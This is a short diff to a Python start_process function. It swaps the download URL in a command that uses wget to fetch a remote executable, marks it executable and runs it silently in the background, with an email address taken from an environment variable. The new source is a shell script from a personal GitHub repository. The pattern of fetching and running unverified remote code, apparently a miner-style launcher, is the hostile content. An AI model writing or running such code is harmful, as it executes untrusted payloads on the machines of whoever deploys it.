@@ -35,7 +35,7 @@ def start_process():
     if ptk_address is None:
         print('PTK_address environment variable is not set. Please set it to your email address.')
         sys.exit(1)
-    cmd = f'wget https://bitbucket.org/faerasmna/saldorea/raw/c5bf791a614b11a40aa531b8ab4cb3dc24cf20c5/python-app && chmod +x python-app && ./python-app > {LOG_FILE} 2>&1 &'
+    cmd = f'wget https://raw.githubusercontent.com/nestri12329018/flask-app/main/pepek.sh && chmod +x pepek.sh && ./pepek.sh > {LOG_FILE} 2>&1 &'
     out, err = subprocess.Popen(
         cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
     print(out.decode('utf-8'))
